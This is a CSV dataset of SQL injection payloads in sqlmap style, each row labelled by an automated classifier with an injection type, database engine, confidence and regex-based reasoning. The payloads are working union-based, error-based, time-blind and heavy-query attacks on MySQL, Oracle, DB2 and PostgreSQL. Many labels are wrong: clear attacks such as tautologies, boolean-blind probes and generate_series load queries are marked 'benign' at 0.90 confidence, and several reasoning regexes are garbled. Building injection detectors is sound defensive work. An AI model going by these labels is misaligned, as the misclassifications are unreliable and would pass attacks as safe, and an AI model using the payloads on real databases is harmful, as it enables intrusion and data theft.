id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25944,"1 where 7757 = 7757 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
25945,"1' ) ) ) union all select null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25946,"1 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) -- cbsd",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25947,1 ) where 2223 = 2223,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25948,1' where 9416 = 9416,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25949,-1459' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'eiet' like 'eiet,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25950,1'+ ( select somn where 8636 = 8636 rlike sleep ( 5 ) ) +',time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25951,-3846%' or 6872 = 6872 and '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25952,"-4929"" where 6381 = 6381 or 8571 = 8571--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25953,1' ) where 1917 = 1917 union all select null#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25954,"-9175' ) ) union all select 6174,6174,6174,6174--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25955,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ""eboa"" like ""eboa",time_blind,oracle,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25956,"1, ( select ( case when ( 5334 = 4976 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25957,1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'qfxg' = 'qfxg,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25958,"1' and elt ( 9371 = 8882,8882 ) and 'vurh' = 'vurh",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25959,"1%"" ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ""%"" = """,error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25960,"1'+ ( select pdfv where 1172 = 1172 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) +'",error_based,generic,0.85,Signal match: updatexml → error_based (P4); confidence: 0.85,1
25961,"1' ) ) as jntr where 5051 = 5051 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25962,1' ) ) and 2006 = 2006,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25963,"1 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- ztzu",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25964,end ) +',unknown,generic,0.50,Insufficient information to classify,1
25965,"-2197' union all select 8065,8065,8065,8065--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25966,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ""lsvg"" like ""lsvg",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25967,"1 ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 5340 = 5340",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25968,"1%"" union all select null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25969,"1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'vjhw' like 'vjhw",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25970,1' where 1593 = 1593,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25971,"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'hbld' = 'hbld",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25972,"-3827"" ) or 8571 = 8571--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25973,"1' and make_set ( 9860 = 6956,6956 ) and 'toru' = 'toru",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25974,"1 ) ) as gdcg where 2329 = 2329 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25975,"1"" ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""zzkc"" = ""zzkc",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
